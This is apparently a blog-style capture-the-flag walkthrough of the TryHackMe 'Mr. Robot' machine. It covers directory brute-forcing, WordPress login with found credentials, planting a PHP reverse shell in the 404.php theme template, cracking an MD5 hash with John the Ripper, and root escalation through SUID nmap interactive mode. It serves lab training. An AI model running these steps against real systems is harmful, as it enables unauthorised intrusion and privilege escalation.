👋Introduction

Hello everyone! Sh4d0wSpl01t here. Today we're going to dive deep into Mr. Robot, a medium-level machine on TryHackMe inspired by the hit TV series. This room covers web enumeration, WordPress exploitation, password cracking, and privilege escalation via SUID binaries.

  • Hidden directories and information disclosure via /robots.txt
  • WordPress credential brute-forcing with a custom dictionary
  • Reverse shell delivery through theme injection
  • SUID binary abuse for root privilege escalation

Let's hack our way into the system — just like our favorite hacker, Elliot Alderson.

🔍Phase 1: Reconnaissance

As with any pentest, we start with enumeration. Our weapon of choice: nmap.

bash
nmap -sC -sV -oN nmap-initial.txt 10.10.x.x

📁Phase 2: Web Enumeration — the robots.txt discovery

The landing page looks stylish, but the real treasure is in hidden directories. Time to brute-force them.

bash
ffuf -u http://10.10.x.x/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

The robots path stands out. Navigating to /robots turns up two immediate findings: a flag file and a wordlist.

🔑First Flag — Key 1 of 3

bash
curl http://10.10.x.x/key-1-of-3.txt

📚The Dictionary File

We also grab the wordlist fsocity.dic — it comes in handy later for cracking a password hash.

bash
curl -O http://10.10.x.x/fsocity.dic
sort fsocity.dic | uniq > fsocity-clean.dic

Digging through the license directory turns up a base64 blob buried further down the page.

bash
echo '<base64 string>' | base64 -d

🔒Phase 3: WordPress Discovery & Brute Force

The presence of /wp-login confirms a WordPress install. We already have a decoded credential to try.

💉Phase 4: Gaining Foothold — WordPress to Reverse Shell

Logging in with elliot / ER28-0652 gets us into the WordPress admin panel.

  • Navigate to Appearance → Theme Editor
  • Select the 404.php template — often overlooked, perfect for a payload
  • Replace the contents with a PHP reverse shell and click Update File
bash
# on the attacking machine
nc -lvnp 1234
bash
# trigger the shell by requesting a page that 404s
curl http://10.10.x.x/?404.php

Stabilize the shell once it lands:

bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
export SHELL=/bin/bash
# Ctrl+Z, then:
stty raw -echo; fg

👤Phase 5: Privilege Escalation — From Daemon to Robot

bash
ls -la /home
cd /home/robot
cat password.raw-md5

That's an MD5 hash — crack it with John the Ripper against rockyou:

bash
echo "c3fcd3d76192e4007dfb496cca67e13b" > hash.txt
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
bash
su robot
cat /home/robot/key-2-of-3.txt

👑Phase 6: Privilege Escalation — From Robot to Root

Time to hunt for SUID binaries — files that execute with the owner's privileges.

bash
find / -type f -perm -04000 2>/dev/null

nmap's interactive mode allows shelling out — and since it runs as root, that gives us a root shell.

bash
nmap --interactive
!sh
bash
cd /root
ls
cat key-3-of-3.txt

All three keys captured — box rooted.
